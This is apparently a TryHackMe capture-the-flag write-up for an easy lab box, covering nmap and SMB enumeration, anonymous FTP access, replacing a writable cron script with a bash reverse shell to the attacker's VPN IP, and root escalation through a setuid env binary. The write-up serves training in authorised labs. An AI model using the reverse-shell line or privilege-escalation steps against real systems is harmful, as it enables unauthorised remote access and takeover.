Easy Tryhackme Box

## Recon

I did an nmap scan on the box that revealed 4 open ports.

But the ftp port had anonymous login enabled which was very easy to exploit.
And the rest were ok.

```bash
# Nmap 7.91 scan initiated Mon Aug  2 20:30:10 2021 as: nmap -sC -sV -Pn -oN initial.nmap 10.10.170.122
Nmap scan report for 10.10.170.122
Host is up (0.17s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.14.13.156
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 0s
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2021-08-02T15:00:46+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-02T15:00:46
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Aug  2 20:30:50 2021 -- 1 IP address (1 host up) scanned in 39.91 seconds
```

## Enumeration

I tried enumerating for shares on the ports 139, 445 for smb shares.

```bash 
smbclient -L //HOST-IP/ -N
```

This gives me shares with the names of `pics`. 

Logging into them as user and downloading those pictures thinking it might have some steg involved ended up as a rabbit hole.

But FTP service on this machine allows anonymous user login. So I logged into the ftp on port 21 with creds : `anonymous:anonymous`.
It really doesn't matter what the password is as long as username is `anonymous`.

## Exploit

There are 3 files in the ftp server. one of them is just a to_do.txt and irrelevant.

There is a `clean.sh` and a `removed_files.log` file.

Looking at the `clean.sh` file, it seems it checks if any files are present in the tmp folder and logs them into `removed_files.log` file.

So this must be a cronjob that executes itself after a certain time interval.

So I changed the script to a bash reverse shell using `!nano` command and started a listener on my local machine.

clean.sh: \
```bash
#!/bin/bash
bash -i >& /dev/tcp/<VPN-IP>/9999 0>&1
```

And so after some time, we get a shell as the user `namelessone`.

## Priv Esc

I used the `find` command to find any setuids that I can use for priv esc.

```bash
find / -perm -u=s -type f -user root 2>/dev/null
```

I found the setuid `/usr/bin/env` that has it's setuid bit set.

Using the command from gtfobins for [env](https://gtfobins.github.io/gtfobins/env/).

We can get direct root access. Now we can go ahead and read both user and root flags.